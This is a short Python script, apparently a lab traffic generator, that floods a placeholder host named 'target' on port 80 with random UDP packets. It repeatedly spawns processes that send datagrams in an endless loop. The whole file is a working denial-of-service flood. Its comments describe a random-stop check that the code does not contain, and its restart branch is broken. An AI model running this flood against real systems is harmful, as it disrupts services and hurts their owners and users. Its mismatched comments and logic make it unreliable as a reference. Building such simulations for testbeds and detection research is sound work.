#!/usr/bin/env python3
'''Python script designed to simulate a DDoS attack.'''
import time
import random
import multiprocessing
import socket, os

# Tuple containing the target address and port
TARGET = ('target', 80)

def attack():
    # Open the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Send a random set of bytes to the target server
    while True:
        sock.sendto(os.urandom(1490), TARGET)

if __name__ == '__main__':
    # Wait a few seconds for target container to spin up
    time.sleep(3)

    while True:
        # Start the ddos process
        p = multiprocessing.Process(target=attack)
        p.start()

        # Sleep for 5 seconds
        time.sleep(5)

        # Generate random int, if it's 5 then stop the DDoS or restart it:
        if p.is_alive():
            p.terminate()
            p.join()
        else: p.start()
